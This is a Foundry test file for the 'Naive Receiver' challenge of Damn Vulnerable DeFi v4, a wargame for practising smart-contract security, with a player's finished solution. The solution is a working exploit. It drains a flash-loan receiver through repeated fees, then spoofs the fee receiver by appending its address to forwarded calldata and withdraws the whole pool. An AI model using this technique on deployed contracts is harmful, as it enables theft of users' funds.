// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        /*
            The vulnerability is in the NaiveReceiver _msgSender function. Basically if trustedForwarder is the caller(msg.sender) and msg.data>20 
            then it will splits msg.data to obtain extra bytes and then parsing it to address which is going to be used as new 
            _msgSender() response.

            The strategy is to call the NaiveReceiver contract withdraw function forwarded with trustedForwarder with some 
            extra msg.data which will parse as address which has deposited balance - essentialy injecting the address of the feeReceiver for 
            which we want to effectivly widthdaw the balance.

            Since the flashloan fee of 1 ETH is stored in the deposts for the feeReceive on each call of flashLoan function we 
            can call this 10 times to get a balance of 10 ETH into this deposits mapping and then call the withdraw function using 
            exploiting the vulnerability in the _msgSender function mentioned above.
            
            NOTE: Initial state of the pool is thet the feeReceiver (which is also the deployer account as shown in the setUp function above) 
            has 1000 ETH in pool depoists (pool.deposits(pool.feeReceiver()) == 1000 WETH).

            Moreover the FlashLoanReceiver contract has 10 WETH in balance (weth.balanceOf(address(receiver)) == 10 WETH).
        */
        
        // prepare an empty bytes array of length 11 for the multicall
        bytes[] memory callDatas = new bytes[](11);
        
        /* 
            Prepare callDataa for 10 calls to the flashLoan function - on each call the receiver will pay 1 WETH to the pool (the
            WETH is approved in the onFlashLoan of the FlashLoanReceiver and then transfered after the callback in the flashLoan function).

            The reason for doing this is to increase the pool.deposits balance of the feeReceiver by 10 WETH so we can 
            exploit the vulnerability in the _msgSender function and withdrwa that along with the existing 1000 WETH.
        */
        for(uint i=0; i<10; i++){
            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
        }
        
        /* 
            Prepare one call to the withdraw function for total WETH balance to the revovery contract which is the 1000 WETH initially in the pool +
            the 10 WETH that will have been transfered in from the FlashLoanReceiver contract.

            NOTE: the extra data appended after the withdraw function parameters which is the deployer address! Since this request will be sent
            from the trustedForwarder and the data length will be > 20 bytes the _msgSender function will return the deployer (feeReceiver) address! 

            This means that the feeReceiver will be used in the widtdraw function and we will be able to widthdraw the entire balance of the feeReceiver!
        */
        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );


        /*
             NOTE: The rest of the code below is really boilerpate to package up the request into a 
             valid multicall the sign and send via the Forwarder
        */

        
        // bundle all the 11 calls together in a single multicall request
        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, callDatas);

        // create a BaesicForwarder.Request struct with the request details
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0, // value
            30000000, // gas
            forwarder.nonces(player), // nonce
            callData, // 10 flashLoan + 1 widhdraw call
            1 days // deadline
        );

        // hash the request using EIP 712 standard
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );

        // player signs the request hash
        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // send the request struct with the signnature to the Forwarder execute function
        require(forwarder.execute(request, signature));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
